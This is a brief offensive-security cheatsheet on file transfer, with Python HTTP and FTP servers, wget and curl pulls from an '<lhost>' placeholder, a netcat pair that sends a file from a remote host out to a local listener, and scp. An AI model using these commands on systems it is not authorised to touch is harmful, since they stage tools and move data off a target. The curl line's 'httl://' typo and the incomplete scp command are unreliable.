---
title: File Transfer
description: File Transfer cheatsheet
date: 1970-01-19
categories: [Cheatsheets]
tags: [cheatsheets,file-transfer]
---

## Web Server

```console
python2 -m SimpleHTTPServer 8000
python3 -m http.server 8000

wget http://<lhost>:8000/<file>
curl httl://<lhost>:8000/<file> -O
```

## FTP Server

```console
python -m pyftpdlib -p 21 -w
```

## Netcat

```console
nc -nvlp <lport> > file # local machine
nc -vn <lhost> <lport> < file # remote machine
```

## SCP

```console
scp <user>@<rhost>:/path
```
